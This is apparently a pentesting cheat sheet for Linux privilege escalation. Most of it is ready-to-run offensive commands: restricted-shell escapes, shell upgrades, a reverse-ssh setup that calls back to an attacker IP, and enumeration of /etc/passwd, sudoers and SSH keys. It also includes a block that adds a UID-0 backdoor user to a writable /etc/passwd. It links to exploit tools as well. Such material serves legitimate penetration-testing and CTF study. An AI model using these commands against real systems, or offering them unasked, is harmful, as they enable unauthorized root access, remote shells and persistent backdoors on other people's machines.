## Enumeration is the key

What is your path to root?

- https://sirensecurity.io/blog/linux-privilege-escalation-resources/
- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

### Breaking out from restricted shells

- https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf

Common bypass techniques:

`/bin/bash`

`cp /bin/bash ./`

```bash
ftp
!/bin/sh
```

```bash
vim
!/bin/sh
```

```bash
scp tom@localhost:/bin/bash ./
```


### Upgrading a low-priv shell

Using Python3:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
Ctrl + Z [Background Process]
stty raw -echo ; fg ; reset
stty columns 200 rows 200
```

Upgrading a netcat shell to a fully interactive ssh shell:

- https://github.com/Fahrj/reverse-ssh#build-tricks

on the attacker box:

```bash
./reverse-sshx64 -v -l 192.168.49.65:80
```

on the victim box:

```bash
./reverse-sshx64 -v -p 80 192.168.49.65
```

connect to your shell:

```bash
ssh kali@localhost -p 80
Password: letmeinbrudipls
```

## System Enumeration

Checking compilation capabilities:

```bash
which gcc
which cc
which python
which perl
```

Checking file-transfer capabilities:

```bash
which wget
which curl
which nc
ls -lsaht /bin/ |grep -i 'ftp' --color=auto
```

Checking the kernel/release version:

```bash
cat /etc/issue
cat /etc/*-release
```

Are we a sudo user?

```bash
sudo -l
cat /etc/sudoers
```

Checking environment variables:

```bash
env
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
```

Checking system processes:

```bash
ps aux
ps -ef
```

Checking system users:

```bash
cat /etc/passwd
cd /home && ls -lsaht
```

Finding SUID binaries:

```bash
find / -perm -u=s 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

Finding GUID binaries:

```bash
find / -perm -g=s 2>/dev/null
find / -user root -perm -g=s -exec ls -ldb {} \; 2>/dev/null
```

Checking network services:

```bash
netstat -tulpn
ss -tulpn
```

Checking for MySQL unauthorized access:

```bash
mysql -u root -p
```

Checking user-level configurations:

```bash
cd /etc
ls -lsaht
ls -lsaht |grep -i '.conf' --color=auto
```

Searching for SSH keys:

```bash
ls -lsaR /home/
```

Finding writable directories:

```bash
/var/tmp/
/tmp/
```

Finding writable files:

```bash
find / -perm -2 ! -type l -ls 2>/dev/null
```

Finding writable files owned by root:

```bash
find / -perm -2 ! -type l -ls 2>/dev/null |grep root |grep -v "/proc/"
```

Checking unusual system mounts:

```bash
cat /etc/fstab
```

Checking writable /etc/passwd file:

```bash
openssl passwd -1
i<3hacking
$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.
echo 'totekuh:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:totekuh:/home/totekuh:/bin/bash' >> /etc/passwd
su totekuh
id
```

Checking cron jobs:

```bash
crontab –u root –l
cat /etc/crontab
ls /etc/cron.*
```

Looking for every single file created by the given user:

```bash
find . -iname 'USER' 2>/dev/null
```

Any mails?
```bash
cd /var/mail/
ls -lsaht
```

Checking capabilities of a process
- https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/
- https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities

```bash
cat /proc/1234/status | grep Cap
capsh --decode=0000003fffffffff
```

## Resources

### SUID Unix Binaries Abuse

- https://gtfobins.github.io/

### Escalation Using PATH Variable

- https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/

### Unprivileged Linux Process Snooping 

- https://github.com/DominicBreuker/pspy/

### Attacking NFS Shares

- https://recipeforroot.com/attacking-nfs-shares/

### Escalation Awesome Script

- https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

### Escalation Exploit

- https://github.com/liamg/traitor

